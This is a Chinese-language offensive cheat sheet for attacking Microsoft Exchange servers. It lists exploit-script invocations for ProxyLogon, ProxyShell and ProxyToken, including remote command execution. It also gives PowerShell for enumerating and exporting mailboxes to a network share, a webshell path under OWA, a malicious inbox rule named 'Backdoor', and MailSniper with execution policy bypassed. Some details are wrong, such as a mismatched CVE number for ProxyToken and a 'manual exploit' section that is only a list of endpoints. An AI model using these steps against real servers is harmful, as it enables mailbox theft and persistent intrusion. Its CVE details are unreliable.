# Exchange攻击补充

## 1. ProxyLogon (CVE-2021-26855)

### 利用

```bash
python3 proxylogon.py user:password@target.com
```

### 手动利用

```bash
# 获取SID
python3 proxylogon.py domain/user:pass@target.com -r

# 利用
python3 proxylogon.py domain/user:pass@target.com -e "whoami"
```

---

## 2. ProxyShell (CVE-2021-34473)

### 利用

```bash
python3 proxyshell.py user:password@target.com
```

### 手动利用

```bash
# 探测
autodiscover/autodiscover.xml
/mapi/emsmdb/
/EWS/Exchange.asmx
```

---

## 3. ProxyToken (CVE-2021-3129)

### 利用

```bash
# 绕过认证创建cookie
python3 prototoken.py domain/user:pass@target.com
```

---

## 4. Exchange枚举

### 用户枚举

```powershell
Get-User
Get-Mailbox
```

### 邮箱发现

```powershell
Get-Mailbox -ResultSize Unlimited
Get-MailboxDatabase
```

---

## 5. 邮箱访问

### 导出邮箱

```powershell
New-MailboxExportRequest -Mailbox username -FilePath \\server\share\username.pst
```

### 读取邮件

```powershell
Get-MailboxFolder -Identity username
Get-MailboxFolderItem -FolderId folder_id
```

---

## 6. 后门利用

### WebShell

```
/owa/auth/current/themes/
```

### 恶意规则

```powershell
New-InboxRule -Mailbox user -Name "Backdoor" -BodyContainsWords "test" -MoveToFolder "Junk"
```

---

## 7. 工具

```bash
# MailSniper
powershell -ExecutionPolicy Bypass -File MailSniper.ps1

# Exchange前后利用
python3 -m pip install pyexchange
```
